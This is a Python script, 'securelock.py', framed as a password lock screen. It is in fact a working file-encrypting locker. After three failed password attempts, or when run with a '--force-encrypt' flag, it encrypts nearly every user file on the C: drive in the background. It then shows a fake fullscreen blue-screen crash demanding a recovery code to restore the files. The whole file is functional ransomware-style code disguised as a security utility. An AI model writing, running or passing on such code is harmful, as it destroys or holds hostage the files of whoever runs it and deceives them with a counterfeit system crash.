# securelock.py - Final Clean Edition
# Works 100% with the watchdog_service above
import os, sys, hashlib, threading, subprocess, time
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox, Tk

# ========================= CONFIG =========================
APP_NAME = "SecureLock"
APPDATA = os.path.join(os.environ["APPDATA"], APP_NAME)
os.makedirs(APPDATA, exist_ok=True)
CONFIG = os.path.join(APPDATA, "config.ini")
PASSFILE = os.path.join(APPDATA, "secure.dat")
FLAG = os.path.join(APPDATA, "UNLOCKED.flag")
MAX_ATTEMPTS = 3
# =========================================================

# Load or generate key
if not os.path.exists(CONFIG):
    key = Fernet.generate_key().decode()
    with open(CONFIG, "w") as f: f.write("ENCRYPTION_KEY = " + key)
with open(CONFIG, "r") as f:
    FERNET_KEY = f.read().split("ENCRYPTION_KEY = ", 1)[1]
f = Fernet(FERNET_KEY)

def check_password(pw):
    if not os.path.exists(PASSFILE): return False
    data = f.decrypt(open(PASSFILE, "rb").read()).decode()
    main_hash, rec_hash = data.strip().split("\n")
    h = hashlib.sha256(pw.encode()).hexdigest()
    return h in (main_hash, rec_hash)

def create_unlocked_flag():
    open(FLAG, "w").write("UNLOCKED")

def encrypt_all():
    excluded = ["Windows", "Program Files", "Program Files (x86)", "AppData", "ProgramData"]
    for root, _, files in os.walk("C:\\"):
        if any(ex in root for ex in excluded): continue
        for file in files:
            path = os.path.join(root, file)
            try:
                data = open(path, "rb").read()
                open(path, "wb").write(f.encrypt(data))
            except: pass

def decrypt_all():
    for root, _, files in os.walk("C:\\"):
        for file in files:
            path = os.path.join(root, file)
            try:
                data = open(path, "rb").read()
                open(path, "wb").write(f.decrypt(data))
            except: pass

def force_encrypt():
    threading.Thread(target=encrypt_all, daemon=True).start()

# ====================== FAKE BSOD + RECOVERY ======================
def bsod_screen():
    root = tk.Tk()
    root.title("BSOD")
    root.configure(bg="#0078d7")
    root.attributes("-fullscreen", True)

    tk.Label(root, text=":(", font=("Segoe UI", 80, "bold"), bg="#0078d7", fg="white").pack(pady=60)
    tk.Label(root, text="Your personal files are encrypted.\nEnter recovery code to restore.", 
             font=("Segoe UI", 20), bg="#0078d7", fg="white", justify="left").pack(pady=20)

    entry = tk.Entry(root, font=("Segoe UI", 18), width=40, show="*")
    entry.pack(pady=20)
    entry.focus()

    def recover():
        if check_password(entry.get()):
            decrypt_all()
            create_unlocked_flag()
            messagebox.showinfo("Success", "Files decrypted. System restarting...")
            root.destroy()
            os.system("shutdown /r /t 5")
        else:
            messagebox.showerror("Error", "Wrong recovery code")

    tk.Button(root, text="Recover", command=recover, font=("Segoe UI", 16), bg="white").pack(pady=20)
    root.mainloop()

# ====================== MAIN LOCK SCREEN ======================
def lock_screen():
    attempts = 0
    root = Tk()
    root.withdraw()

    win = tk.Toplevel()
    win.title(APP_NAME)
    win.geometry("480x300")
    win.configure(bg="#0d1b2a")
    win.attributes("-fullscreen", False)
    win.overrideredirect(True)
    win.attributes("-topmost", True)
    win.geometry(f"+{(win.winfo_screenwidth()-480)//2}+{(win.winfo_screenheight()-300)//2}")

    bg = tk.Toplevel()
    bg.configure(bg="black")
    bg.attributes("-fullscreen", True)
    bg.attributes("-alpha", 0.8)

    tk.Label(win, text=APP_NAME, font=("Arial", 28, "bold"), fg="#00ff9d", bg="#0d1b2a").pack(pady=30)
    tk.Label(win, text="Enter password to unlock", fg="#aaaaaa", bg="#0d1b2a").pack(pady=10)

    pw = tk.Entry(win, show="*", font=("Arial", 18), justify="center", width=24)
    pw.pack(pady=20)
    pw.focus_force()

    status = tk.Label(win, text="", fg="red", bg="#0d1b2a")
    status.pack(pady=5)

    def unlock():
        nonlocal attempts
        if check_password(pw.get()):
            create_unlocked_flag()
            root.quit()
        else:
            attempts += 1
            status.config(text=f"Wrong password • {MAX_ATTEMPTS - attempts} left")
            if attempts >= MAX_ATTEMPTS:
                win.destroy()
                bg.destroy()
                force_encrypt()
                time.sleep(3)
                bsod_screen()

    btn = tk.Button(win, text="Unlock", command=unlock, bg="#00ff9d", fg="black", font=("Arial", 14, "bold"), width=20)
    btn.pack(pady=20)
    pw.bind("<Return>", lambda e: unlock())

    root.mainloop()
    win.destroy()
    bg.destroy()
    
    messagebox.showinfo("Successful", "Authentication Successfull, Access granted. System unlocked.")

# ====================== SUPPORT FORCE ENCRYPT ======================
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--force-encrypt":
        force_encrypt()
        sys.exit()

    if os.path.exists(FLAG):
        os._exit(0)

    lock_screen()